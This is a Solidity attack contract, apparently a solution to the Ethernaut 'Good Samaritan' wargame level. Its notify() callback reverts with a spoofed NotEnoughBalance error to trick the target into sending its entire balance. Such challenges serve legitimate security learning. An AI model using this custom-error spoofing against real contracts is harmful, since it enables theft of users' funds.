// SPDX-License-Identifier: MIM

pragma solidity ^0.8.0;

interface IGoodSamaritan {
    function requestDonation() external returns (bool enoughBalance);
}

contract Attack {
    error NotEnoughBalance();

    IGoodSamaritan target;

    constructor(address targetAddr) {
        target = IGoodSamaritan(targetAddr);
    }

    function attack() public {
        target.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
